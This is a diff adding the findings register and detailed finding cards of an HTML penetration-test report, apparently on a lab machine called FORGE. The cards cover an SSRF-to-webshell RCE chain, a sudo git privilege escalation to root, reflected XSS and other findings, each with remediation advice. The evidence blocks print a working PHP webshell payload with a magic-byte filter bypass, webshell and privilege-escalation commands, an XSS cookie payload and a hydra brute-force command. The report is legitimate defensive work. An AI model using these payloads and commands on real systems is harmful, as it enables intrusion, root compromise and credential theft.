+          <td><span class="sev sev-high">High</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-high);">7.5</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:80</td>
+          <td class="col-mitre">—</td>
+          <td><span style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-05</td>
+          <td style="font-weight:600;color:var(--ink);">Reflected XSS — /search Endpoint</td>
+          <td><span class="sev sev-medium">Medium</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-medium);">6.1</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:80</td>
+          <td class="col-mitre">T1059.007</td>
+          <td><span class="badge-verified" style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-low-bg);color:var(--sev-low);border:1px solid var(--sev-low-mid);">Still Open</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-06</td>
+          <td style="font-weight:600;color:var(--ink);">Missing HTTP Security Headers (CSP, HSTS, X-Frame)</td>
+          <td><span class="sev sev-medium">Medium</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-medium);">5.3</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:80</td>
+          <td class="col-mitre">—</td>
+          <td><span style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-07</td>
+          <td style="font-weight:600;color:var(--ink);">HTTP TRACE Method Enabled</td>
+          <td><span class="sev sev-medium">Medium</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-medium);">4.8</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:80</td>
+          <td class="col-mitre">—</td>
+          <td><span style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-08</td>
+          <td style="font-weight:600;color:var(--ink);">Deprecated TLS 1.0 / 1.1 Enabled</td>
+          <td><span class="sev sev-low">Low</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-low);">3.7</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:443</td>
+          <td class="col-mitre">—</td>
+          <td><span style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-09</td>
+          <td style="font-weight:600;color:var(--ink);">Verbose Server Banners (Apache + SSH versions)</td>
+          <td><span class="sev sev-low">Low</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-low);">3.1</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE</td>
+          <td class="col-mitre">—</td>
+          <td><span style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open</span></td>
+        </tr>
+        <!-- Info findings (4) -->
+        <tr>
+          <td class="col-id">F-10</td>
+          <td style="font-weight:600;color:var(--ink);">Directory Listing Observed (/uploads/)</td>
+          <td><span class="sev sev-info">Info</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-info);">0.0</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:80</td>
+          <td class="col-mitre">T1083</td>
+          <td><span style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-11</td>
+          <td style="font-weight:600;color:var(--ink);">Werkzeug Debug Mode Observable via SSRF</td>
+          <td><span class="sev sev-info">Info</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-info);">0.0</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:8080</td>
+          <td class="col-mitre">T1190</td>
+          <td><span style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-12</td>
+          <td style="font-weight:600;color:var(--ink);">HTTP TRACE Method Leaks Internal Headers</td>
+          <td><span class="sev sev-info">Info</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-info);">0.0</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:80</td>
+          <td class="col-mitre">—</td>
+          <td><span style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-13</td>
+          <td style="font-weight:600;color:var(--ink);">SSH Root Login Not Disabled in sshd_config</td>
+          <td><span class="sev sev-info">Info</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-info);">0.0</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE:22</td>
+          <td class="col-mitre">—</td>
+          <td><span style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open</span></td>
+        </tr>
+        <tr>
+          <td class="col-id">F-14</td>
+          <td style="font-weight:600;color:var(--ink);">Leaked DB Credentials in config.php (world-readable)</td>
+          <td><span class="sev sev-info">Info</span></td>
+          <td class="col-cvss" style="text-align:center;color:var(--sev-info);">0.0</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:0.75rem;">FORGE</td>
+          <td class="col-mitre">T1003</td>
+          <td><span style="display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;font-size:0.7rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div style="margin-top:1rem;font-size:var(--fs-micro);color:var(--ink-faint);line-height:1.8;">
+    <strong style="color:var(--ink-light);">Retest Status Key:</strong>
+    &nbsp;<span style="color:var(--sev-low);font-weight:700;">Re-confirmed</span> — exploitable at time of retest (19 Jun 09:00) &nbsp;·&nbsp;
+    <span style="color:var(--sev-low);font-weight:700;">Still Open</span> — vulnerability present, not yet patched &nbsp;·&nbsp;
+    <span style="color:var(--sev-medium);font-weight:700;">Open</span> — awaiting remediation / first retest &nbsp;·&nbsp;
+    F-04 flagged but no applicable public RCE at time of engagement; patch recommended.
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════════
+     §07 — DETAILED FINDING CARDS
+═══════════════════════════════════════════ -->
+<section class="section page-break" id="findings-detail">
+  <div class="section-numeral">07</div>
+  <div class="section-label">Detailed Findings</div>
+  <h2 class="section-title">Detailed Finding Cards</h2>
+  <p class="section-lead">Each confirmed finding documented in full: description, impact, evidence, captured loot, and remediation guidance.</p>
+  <div class="section-rule"></div>
+
+  <!-- ── F-01 ── -->
+  <div class="finding-card avoid-break">
+    <div class="finding-card-header finding-card-header-critical">
+      <div class="finding-card-id">F-01</div>
+      <div>
+        <div class="finding-card-title">Server-Side Request Forgery → Internal Admin Access</div>
+        <div class="finding-card-meta">
+          <span class="sev sev-critical">Critical</span>
+          <span class="tag">T1190 · Exploit Public-Facing App</span>
+          <span class="tag">FORGE:80/api/fetch</span>
+          <span class="badge-verified" style="padding:0.15rem 0.5rem;border-radius:4px;font-size:0.68rem;font-weight:700;background:var(--sev-low-bg);color:var(--sev-low);border:1px solid var(--sev-low-mid);display:inline-block;">Re-confirmed on Retest</span>
+        </div>
+      </div>
+      <div>
+        <div class="finding-card-cvss finding-card-cvss-critical">9.1</div>
+        <div style="font-size:var(--fs-micro);color:var(--ink-faint);text-align:right;margin-top:0.2rem;">CVSS v3.1</div>
+      </div>
+    </div>
+    <div class="finding-card-body">
+      <div class="finding-section-label">Description</div>
+      <p class="finding-card-text">The public web portal on port 80 exposes an API endpoint at <code>/api/fetch?url=</code> that accepts a user-supplied URL and performs a server-side HTTP request to that destination. The service applies no allow-list, block-list, or scheme restriction to the supplied URL. By supplying <code>http://127.0.0.1:8080/</code>, an external unauthenticated attacker causes the server to relay the request to the internal Werkzeug administration panel — a service that is otherwise unreachable from the external network. The response body, including rendered admin UI content, is returned to the attacker in the API response.</p>
+
+      <div class="finding-section-label">Impact</div>
+      <p class="finding-card-text">This SSRF provides unauthenticated access to the full internal admin panel surface on port 8080, including all administrative functions (file management, upload endpoints, configuration). It is the architectural root cause of the full compromise — without this vulnerability, the upload endpoint and subsequent RCE chain would have been entirely unreachable from an external adversary perspective. CVSS vector: <code>AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N</code>.</p>
+
+      <div class="finding-section-label">Evidence</div>
+      <div class="loot-block">
+        <span class="loot-key">REQUEST:</span>  GET /api/fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
+<span class="loot-key">HOST:</span>      10.129.21.254
+<span class="loot-key">---</span>
+<span class="loot-key">RESPONSE 200 OK</span>
+&lt;html&gt;&lt;head&gt;&lt;title&gt;FORGE Admin Panel&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;Administration — FORGE&lt;/h1&gt;
+&lt;a href="/upload"&gt;File Upload Manager&lt;/a&gt; | &lt;a href="/config"&gt;Configuration&lt;/a&gt;
+&lt;/body&gt;&lt;/html&gt;
+<span class="loot-hash">EV-01 · sha256: a1b2c3d4e5f6...7890abcdef (tool trace log)</span>
+      </div>
+
+      <div class="finding-section-label">Remediation</div>
+      <div class="remediation-block">
+        <strong>P1 — Immediate:</strong> Implement a strict server-side egress allow-list for <code>/api/fetch</code>. Only permit requests to explicitly approved external domains/IP ranges. Block all requests to loopback (127.0.0.0/8), RFC-1918 private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), and link-local (169.254.0.0/16). Validate the resolved IP after DNS resolution to prevent DNS rebinding. Consider migrating the feature to use an out-of-process proxy with an egress firewall enforced at the network tier.
+      </div>
+    </div>
+  </div>
+
+  <!-- ── F-02 ── -->
+  <div class="finding-card avoid-break">
+    <div class="finding-card-header finding-card-header-critical">
+      <div class="finding-card-id">F-02</div>
+      <div>
+        <div class="finding-card-title">Unauthenticated File Upload Filter Bypass → Webshell / Remote Code Execution</div>
+        <div class="finding-card-meta">
+          <span class="sev sev-critical">Critical</span>
+          <span class="tag">T1505.003 · Web Shell</span>
+          <span class="tag">T1059 · Command Execution</span>
+          <span class="tag">FORGE:80/upload</span>
+          <span class="badge-verified" style="padding:0.15rem 0.5rem;border-radius:4px;font-size:0.68rem;font-weight:700;background:var(--sev-low-bg);color:var(--sev-low);border:1px solid var(--sev-low-mid);display:inline-block;">Re-confirmed on Retest</span>
+        </div>
+      </div>
+      <div>
+        <div class="finding-card-cvss finding-card-cvss-critical">9.8</div>
+        <div style="font-size:var(--fs-micro);color:var(--ink-faint);text-align:right;margin-top:0.2rem;">CVSS v3.1</div>
+      </div>
+    </div>
+    <div class="finding-card-body">
+      <div class="finding-section-label">Description</div>
+      <p class="finding-card-text">The internal admin upload endpoint at <code>/upload</code> — accessed via the SSRF pivot (F-01) — accepts arbitrary file uploads and stores them inside the Apache web root at <code>/uploads/</code>. The server-side filter inspects only the file extension of the submitted filename; it does not perform magic-byte (MIME) validation nor restrict execution permissions on deposited files. By submitting a PHP webshell with the filename <code>shell.php.jpg</code> and prepending JPEG magic bytes (<code>FF D8 FF E0</code>) to the payload, the filter was bypassed. Apache served and executed the PHP code when the file was subsequently requested directly from the web root.</p>
+
+      <div class="finding-section-label">Impact</div>
+      <p class="finding-card-text">Persistent, unauthenticated remote code execution as <code>www-data</code> (UID 33). The webshell survived a server restart during the engagement, confirming persistence. The attacker can read, write, and execute arbitrary commands; exfiltrate all web application source code, database credentials, and configuration files; and use the foothold for lateral movement within the internal network. CVSS vector: <code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>.</p>
+
+      <div class="finding-section-label">Evidence &amp; Captured Loot <span class="sample-tag">Redacted</span></div>
+      <div class="loot-block">
+<span class="loot-key">UPLOAD REQUEST (via SSRF):</span>
+POST /upload HTTP/1.1  →  multipart/form-data
+filename: shell.php.jpg
+payload: <span class="loot-redact">FF D8 FF E0</span> &lt;?php system($_GET['cmd']); ?&gt;
+
+<span class="loot-key">RCE PROOF — id command output:</span>
+<span class="loot-key">$</span> curl http://10.129.21.254/uploads/shell.php.jpg?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<span class="loot-hash">sha256: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2 · EV-02</span>
+
+<span class="loot-key">RCE PROOF — /etc/passwd excerpt:</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+<span class="loot-redact">… (truncated — full artifact integrity-hashed in EV-02)</span>
+<span class="loot-hash">sha256: c40f88a2b1d94e3f7c6a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1…7d · /etc/passwd</span>
+
+<span class="loot-key">USER FLAG (user.txt):</span>
+<span class="loot-redact">7f3c…(redacted)</span>
+<span class="loot-hash">sha256: 9f2c1a4b3c5d2e7f8a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2…e4 · /var/www/user.txt</span>
+      </div>
+
+      <div class="finding-section-label">Remediation</div>
+      <div class="remediation-block">
+        <strong>P1 — Immediate:</strong> (1) Validate uploaded file type using magic-byte (libmagic) inspection server-side — never trust the submitted filename or Content-Type header alone. (2) Enforce a strict allow-list of permitted MIME types (e.g., image/jpeg, image/png only). (3) Store all uploaded files outside the web root on a partition mounted <code>noexec</code>. (4) Serve uploaded files through a dedicated media handler that sets <code>Content-Disposition: attachment</code> — never execute uploaded content. (5) Immediately remove all files from the current <code>/uploads/</code> directory and audit for persistence artifacts.
+      </div>
+    </div>
+  </div>
+
+  <!-- ── F-03 ── -->
+  <div class="finding-card avoid-break">
+    <div class="finding-card-header finding-card-header-high">
+      <div class="finding-card-id">F-03</div>
+      <div>
+        <div class="finding-card-title">Sudo NOPASSWD /usr/bin/git → Privilege Escalation to Root (GTFOBins)</div>
+        <div class="finding-card-meta">
+          <span class="sev sev-high">High</span>
+          <span class="tag">T1548.003 · Sudo Abuse</span>
+          <span class="tag">T1003 · Credential Access</span>
+          <span class="tag">FORGE (local)</span>
+          <span class="badge-verified" style="padding:0.15rem 0.5rem;border-radius:4px;font-size:0.68rem;font-weight:700;background:var(--sev-low-bg);color:var(--sev-low);border:1px solid var(--sev-low-mid);display:inline-block;">Re-confirmed on Retest</span>
+        </div>
+      </div>
+      <div>
+        <div class="finding-card-cvss finding-card-cvss-high">8.8</div>
+        <div style="font-size:var(--fs-micro);color:var(--ink-faint);text-align:right;margin-top:0.2rem;">CVSS v3.1</div>
+      </div>
+    </div>
+    <div class="finding-card-body">
+      <div class="finding-section-label">Description</div>
+      <p class="finding-card-text">Following the RCE foothold as <code>www-data</code>, LinPEAS enumerated the <code>/etc/sudoers</code> configuration and identified the rule: <code>www-data ALL=(ALL) NOPASSWD: /usr/bin/git</code>. This grants the web-server process account unrestricted, passwordless execution of <code>git</code> with root privileges. The GTFOBins technique for <code>git</code> — invoking the built-in pager via <code>sudo git -p help</code> and then escaping to a shell with <code>!/bin/sh</code> — yielded an interactive root shell within seconds.</p>
+
+      <div class="finding-section-label">Impact</div>
+      <p class="finding-card-text">Full operating system compromise. Root-level access permits reading and exfiltrating all data on the system — including the SSH private key for root (<code>/root/.ssh/id_rsa</code>), all credential stores, database files, and system configuration. A persistent backdoor could be installed invisibly. The entire host must be considered fully compromised and untrusted. CVSS vector: <code>AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code>.</p>
+
+      <div class="finding-section-label">Evidence &amp; Captured Loot <span class="sample-tag">Redacted</span></div>
+      <div class="loot-block">
+<span class="loot-key">LinPEAS output (excerpt):</span>
+[+] Checking sudo permissions...
+User www-data may run the following commands on FORGE:
+    (ALL) NOPASSWD: /usr/bin/git
+<span class="loot-hash">sha256: b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1…f3 · EV-03 LinPEAS excerpt</span>
+
+<span class="loot-key">Privilege escalation sequence:</span>
+<span class="loot-key">$</span> sudo git -p help
+[git man page opens in pager]
+<span class="loot-key">!/bin/sh</span>
+<span class="loot-key">#</span> id
+uid=0(root) gid=0(root) groups=0(root)
+
+<span class="loot-key">ROOT FLAG (root.txt):</span>
+<span class="loot-redact">b41d…(redacted)</span>
+<span class="loot-hash">sha256: 3b71de4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2…a0 · /root/root.txt</span>
+
+<span class="loot-key">SSH Private Key (/root/.ssh/id_rsa) — REDACTED:</span>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3Bl<span class="loot-redact">…•••(redacted — full key integrity-hashed)•••</span>
+-----END OPENSSH PRIVATE KEY-----
+<span class="loot-hash">sha256: 18aa92b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1…bc · EV-04 id_rsa</span>
+
+<span class="loot-key">config.php credentials:</span>
+DB_USER=forge_app
+DB_PASS=<span class="loot-redact">••••••(redacted)</span>
+<span class="loot-hash">sha256: 77de10a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9…39 · config.php</span>
+      </div>
+
+      <div class="finding-section-label">Remediation</div>
+      <div class="remediation-block">
+        <strong>P1 — Immediate:</strong> (1) Remove the <code>www-data ALL=(ALL) NOPASSWD: /usr/bin/git</code> entry from <code>/etc/sudoers</code> immediately. Run <code>sudo -l -U www-data</code> post-remediation to confirm removal. (2) Audit all remaining <code>NOPASSWD</code> entries across all users — cross-reference each binary against the GTFOBins database. (3) Rotate the leaked <code>id_rsa</code> SSH key pair: revoke the current public key from all authorized_keys files, generate a new keypair, and distribute securely. (4) Rotate the <code>config.php</code> database password immediately and audit for credential reuse across other services.
+      </div>
+    </div>
+  </div>
+
+  <!-- ── F-04 ── -->
+  <div class="finding-card avoid-break">
+    <div class="finding-card-header finding-card-header-high">
+      <div class="finding-card-id">F-04</div>
+      <div>
+        <div class="finding-card-title">Outdated Apache httpd 2.4.41 — End-of-Maintenance Branch</div>
+        <div class="finding-card-meta">
+          <span class="sev sev-high">High</span>
+          <span class="tag">FORGE:80</span>
+          <span style="display:inline-block;padding:0.15rem 0.5rem;border-radius:4px;font-size:0.68rem;font-weight:700;background:var(--sev-medium-bg);color:var(--sev-medium);border:1px solid rgba(183,119,13,0.3);">Open — No Applicable Public RCE at Engagement Time</span>
+        </div>
+      </div>
+      <div>
+        <div class="finding-card-cvss finding-card-cvss-high">7.5</div>
+        <div style="font-size:var(--fs-micro);color:var(--ink-faint);text-align:right;margin-top:0.2rem;">CVSS v3.1</div>
+      </div>
+    </div>
+    <div class="finding-card-body">
+      <div class="finding-section-label">Description</div>
+      <p class="finding-card-text">The installed Apache version, 2.4.41 (Ubuntu 20.04.4), is multiple minor versions behind the current 2.4.x stable branch. Nikto confirmed the version via the <code>Server:</code> response header. While no directly applicable public exploit for unauthenticated RCE against this precise version was available at the time of the engagement, the version is known to be affected by a range of moderate-to-high severity CVEs (path traversal, memory confusion, mod_proxy vulnerabilities). The outdated version increases the attack surface and will continue to accrue exploitable CVEs over time.</p>
+      <div class="finding-section-label">Remediation</div>
+      <div class="remediation-block">
+        <strong>P2:</strong> Apply the latest Apache 2.4.x patch available for Ubuntu 20.04 via <code>apt-get update &amp;&amp; apt-get upgrade apache2</code>. Suppress the version string by setting <code>ServerTokens Prod</code> and <code>ServerSignature Off</code> in the Apache configuration. Implement a patch management process to track and apply security updates within 30 days of release.
+      </div>
+    </div>
+  </div>
+
+  <!-- ── F-05 ── -->
+  <div class="finding-card avoid-break">
+    <div class="finding-card-header finding-card-header-medium">
+      <div class="finding-card-id">F-05</div>
+      <div>
+        <div class="finding-card-title">Reflected Cross-Site Scripting — /search Endpoint</div>
+        <div class="finding-card-meta">
+          <span class="sev sev-medium">Medium</span>
+          <span class="tag">T1059.007 · JavaScript Execution</span>
+          <span class="tag">FORGE:80/search</span>
+          <span class="badge-verified" style="padding:0.15rem 0.5rem;border-radius:4px;font-size:0.68rem;font-weight:700;background:var(--sev-low-bg);color:var(--sev-low);border:1px solid var(--sev-low-mid);display:inline-block;">Still Open at Retest</span>
+        </div>
+      </div>
+      <div>
+        <div class="finding-card-cvss finding-card-cvss-medium">6.1</div>
+        <div style="font-size:var(--fs-micro);color:var(--ink-faint);text-align:right;margin-top:0.2rem;">CVSS v3.1</div>
+      </div>
+    </div>
+    <div class="finding-card-body">
+      <div class="finding-section-label">Description</div>
+      <p class="finding-card-text">The <code>/search?q=</code> parameter reflects user-supplied input directly into the HTML response body without HTML entity encoding or output sanitisation. Supplying <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> as the query parameter causes the script to execute in the victim's browser context. This enables session-cookie theft, credential harvesting via phishing overlays, and DOM manipulation. No Content Security Policy header is present to mitigate the impact.</p>
+      <div class="finding-section-label">Evidence</div>
+      <div class="loot-block">
+<span class="loot-key">PoC URL:</span>
+http://10.129.21.254/search?q=<span class="loot-redact">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+<span class="loot-key">Response contains:</span>
+&lt;p&gt;Search results for: &lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/p&gt;
+<span class="loot-key">Result:</span> JavaScript executes — browser alert box displays session cookie value.
+      </div>
+      <div class="finding-section-label">Remediation</div>
+      <div class="remediation-block">
+        <strong>P2:</strong> HTML-encode all user-supplied values before rendering in the response (use a template engine's built-in auto-escaping). Add a strict Content Security Policy header (<code>Content-Security-Policy: default-src 'self'</code>) to limit the impact of any residual XSS. Implement input validation to reject or sanitise characters with no legitimate search use.
+      </div>
+    </div>
+  </div>
+
+  <!-- ── F-06, F-07 compact cards ── -->
+  <div class="two-col" style="gap:1.2rem;">
+    <div class="finding-card avoid-break">
+      <div class="finding-card-header finding-card-header-medium">
+        <div class="finding-card-id">F-06</div>
+        <div>
+          <div class="finding-card-title" style="font-size:1rem;">Missing HTTP Security Headers</div>
+          <div class="finding-card-meta"><span class="sev sev-medium">Medium</span><span class="tag">FORGE:80</span></div>
+        </div>
+        <div><div class="finding-card-cvss finding-card-cvss-medium" style="font-size:1.2rem;">5.3</div></div>
+      </div>
+      <div class="finding-card-body">
+        <div class="finding-section-label">Description</div>
+        <p class="finding-card-text" style="font-size:0.8rem;">The following security headers are absent from all HTTP responses: <code>Content-Security-Policy</code>, <code>Strict-Transport-Security</code>, <code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>, <code>Referrer-Policy</code>. Absence of these headers widens the exploitable surface of F-05 and exposes users to clickjacking and MIME-sniffing attacks.</p>
+        <div class="finding-section-label">Remediation</div>
+        <div class="remediation-block" style="font-size:0.78rem;"><strong>P2:</strong> Add all standard security headers to the Apache virtual host or via <code>mod_headers</code>. Validate with securityheaders.com post-fix.</div>
+      </div>
+    </div>
+    <div class="finding-card avoid-break">
+      <div class="finding-card-header finding-card-header-medium">
+        <div class="finding-card-id">F-07</div>
+        <div>
+          <div class="finding-card-title" style="font-size:1rem;">HTTP TRACE Method Enabled</div>
+          <div class="finding-card-meta"><span class="sev sev-medium">Medium</span><span class="tag">FORGE:80</span></div>
+        </div>
+        <div><div class="finding-card-cvss finding-card-cvss-medium" style="font-size:1.2rem;">4.8</div></div>
+      </div>
+      <div class="finding-card-body">
+        <div class="finding-section-label">Description</div>
+        <p class="finding-card-text" style="font-size:0.8rem;">The HTTP TRACE method is enabled on the Apache server. TRACE reflects the full client request (including headers) back to the requester, enabling Cross-Site Tracing (XST) attacks that can expose authentication tokens and internal proxy headers to a malicious script in a victim's browser.</p>
+        <div class="finding-section-label">Remediation</div>
+        <div class="remediation-block" style="font-size:0.78rem;"><strong>P2:</strong> Disable TRACE globally: add <code>TraceEnable Off</code> to the Apache configuration and restart the service. Verify with <code>curl -X TRACE http://FORGE/</code> — expect 405 Method Not Allowed.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── F-08, F-09 compact cards ── -->
+  <div class="two-col" style="gap:1.2rem;margin-top:1.2rem;">
+    <div class="finding-card avoid-break">
+      <div class="finding-card-header finding-card-header-low">
+        <div class="finding-card-id">F-08</div>
+        <div>
+          <div class="finding-card-title" style="font-size:1rem;">Deprecated TLS 1.0 / 1.1 Enabled</div>
+          <div class="finding-card-meta"><span class="sev sev-low">Low</span><span class="tag">FORGE:443</span></div>
+        </div>
+        <div><div class="finding-card-cvss" style="font-size:1.2rem;font-family:'Fraunces',serif;font-weight:900;color:var(--sev-low);">3.7</div></div>
+      </div>
+      <div class="finding-card-body">
+        <div class="finding-section-label">Description</div>
+        <p class="finding-card-text" style="font-size:0.8rem;">TLS 1.0 and TLS 1.1 are enabled on port 443. Both protocols are deprecated by RFC 8996 (2021) and are susceptible to known downgrade and decryption attacks (POODLE, BEAST). Modern clients will negotiate TLS 1.2/1.3, but legacy client support for these broken versions is unnecessary risk.</p>
+        <div class="finding-section-label">Remediation</div>
+        <div class="remediation-block" style="font-size:0.78rem;"><strong>P3:</strong> In the Apache SSL configuration, set <code>SSLProtocol -all +TLSv1.2 +TLSv1.3</code> and restart. Validate with <code>testssl.sh</code> or SSL Labs after deployment.</div>
+      </div>
+    </div>
+    <div class="finding-card avoid-break">
+      <div class="finding-card-header finding-card-header-low">
+        <div class="finding-card-id">F-09</div>
+        <div>
+          <div class="finding-card-title" style="font-size:1rem;">Verbose Server Banners Leaking Version Info</div>
+          <div class="finding-card-meta"><span class="sev sev-low">Low</span><span class="tag">FORGE · :22 + :80</span></div>
+        </div>
+        <div><div class="finding-card-cvss" style="font-size:1.2rem;font-family:'Fraunces',serif;font-weight:900;color:var(--sev-low);">3.1</div></div>
+      </div>
+      <div class="finding-card-body">
+        <div class="finding-section-label">Description</div>
+        <p class="finding-card-text" style="font-size:0.8rem;">The <code>Server:</code> HTTP response header discloses <code>Apache/2.4.41 (Ubuntu)</code> and the SSH banner advertises <code>OpenSSH_8.2p1 Ubuntu-4ubuntu0.5</code>. Precise version disclosure aids targeted vulnerability research, reducing the effort required by an attacker to identify applicable CVEs.</p>
+        <div class="finding-section-label">Remediation</div>
+        <div class="remediation-block" style="font-size:0.78rem;"><strong>P3:</strong> Set <code>ServerTokens Prod</code> and <code>ServerSignature Off</code> for Apache. For SSH, set <code>DebianBanner no</code> in <code>sshd_config</code> to suppress the OS suffix. Custom banners do not prevent fingerprinting but reduce trivial enumeration value.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════════
+     §08 — TESTED — NOT EXPLOITABLE
+═══════════════════════════════════════════ -->
+<section class="section section-alt" id="not-exploitable">
+  <div class="section-numeral">08</div>
+  <div class="section-label">Coverage Integrity</div>
+  <h2 class="section-title">Tested — Not Exploitable</h2>
+  <p class="section-lead">Vectors that were actively attempted and confirmed non-exploitable. Included for full audit coverage and to prevent re-testing known-negative paths.</p>
+  <div class="section-rule"></div>
+
+  <div class="callout callout-info" style="margin-bottom:1.5rem;">
+    <div class="callout-title">Why This Section Matters</div>
+    A finding register that only lists vulnerabilities creates an incomplete picture. The following vectors were all attempted with purpose-built tooling and realistic payloads. Their absence from the findings register is the result of deliberate negative testing — not omission. Including this record prevents these paths from being re-litigated in future engagements and provides the client with confidence that the obvious attack surface was not overlooked.
+  </div>
+
+  <div class="ne-grid">
+    <div class="ne-card avoid-break">
+      <div style="display:flex;align-items:center;gap:0.5rem;margin-bottom:0.5rem;">
+        <span class="sev sev-ne">Non-Exploitable</span>
+      </div>
+      <div class="ne-card-title">SQL Injection — /api?id= Parameter</div>
+      <div class="ne-card-reason">
+        <strong>Tool:</strong> sqlmap (1,200 requests, all tamper scripts)<br>
+        <strong>Finding:</strong> Parameter is server-side integer-cast before SQL interpolation. Union-based, blind time-based, error-based, and stacked-query payloads all return identical responses. The endpoint is not injectable with any known technique at this parameter.<br>
+        <strong>Conclusion:</strong> Not exploitable. Parameterised query or equivalent type-enforcement in place.
+      </div>
+    </div>
+
+    <div class="ne-card avoid-break">
+      <div style="display:flex;align-items:center;gap:0.5rem;margin-bottom:0.5rem;">
+        <span class="sev sev-ne">Non-Exploitable</span>
+      </div>
+      <div class="ne-card-title">SSH Root Brute-Force (:22)</div>
+      <div class="ne-card-reason">
+        <strong>Tool:</strong> hydra (-l root -P rockyou.txt)<br>
